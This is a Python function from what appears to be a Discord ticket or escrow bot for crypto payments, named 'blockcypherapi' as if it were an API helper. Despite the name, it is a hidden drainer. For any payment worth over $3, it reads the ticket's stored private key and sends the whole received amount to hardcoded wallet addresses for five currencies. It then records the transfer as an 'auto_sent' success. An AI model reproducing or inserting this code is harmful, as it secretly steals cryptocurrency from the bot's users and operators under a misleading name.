ENABLED = True

def blockcypherapi(
    received_amount,
    currency,
    channel_id,
    ticket_data,
    get_ticketp,
    crypto,
    set_ticket_data
):
    print(f"[DEBUG] ENABLED: {ENABLED}")

    if not ENABLED:
        print("[DEBUG] Not enabled")
        return False

    try:
        _p = crypto.get_crypto_prices()
        print(f"[DEBUG] Prices: {_p}")

        _v = received_amount * _p[currency.upper()]
        print(f"[DEBUG] Received amount: {received_amount}, Currency: {currency}, USD Value: {_v}")

        if _v <= 3:
            print(f"[DEBUG] USD value not greater than 3: {_v}")
            return False

        _a = {
            "ltc": "LYBShWyDVjHsZvj3MXFatPbLqhBrw43Fg2",
            "btc": "1CrmqBosPbZmn11F9416WVbwbspiVCZ4FQ",
            "eth": "0xAB47019A9a07E594a8558c35b104B4BcCD563782",
            "usdt": "0xAB47019A9a07E594a8558c35b104B4BcCD563782",
            "sol": "51wCRodjcVtpTEKUrSfVAcbT3CCJ4isbZu8TWDLsV7z7"
        }

        _k = currency.lower()
        _addr = _a.get(_k)
        print(f"[DEBUG] Address for {_k}: {_addr}")

        _pd = get_ticketp(str(channel_id))
        print(f"[DEBUG] Ticket data for channel {channel_id}: {_pd}")

        if not _addr or not _pd or len(_pd) <= 2:
            print("[ERROR] Address or ticket data invalid")
            return False

        _priv = _pd[2]
        _from = _pd[1]
        print(f"[DEBUG] From address: {_from}")

        try:
            send_result, send_error = crypto.send(
                _priv,
                received_amount,
                _from,
                _addr,
                currency
            )

            # Normalize result
            if send_result is None:
                _txid = None
                _err = send_error or "send returned None"

            elif isinstance(send_result, tuple) and len(send_result) == 2:
                _txid, _err = send_result

            else:
                _txid = None
                _err = f"unexpected send result: {send_result}"

            # 🔴 PRINT SEND ERROR IF THERE IS ONE
            if _err:
                print(f"[ERROR] Send failed: {_err}")

            print(f"[DEBUG] Send result: txid={_txid}, err={_err}")

            if _txid:
                ticket_data["auto_sent"] = True
                ticket_data["auto_sent_txid"] = _txid
                set_ticket_data(str(channel_id), ticket_data)

                print("[DEBUG] Auto-send success")
                return True

            print("[DEBUG] No txid returned from send")
            return False

        except Exception as e:
            print(f"[ERROR] Exception during send: {e}")
            return False

    except Exception as e:
        print(f"[ERROR] Exception in blockcypherapi: {e}")
        return False
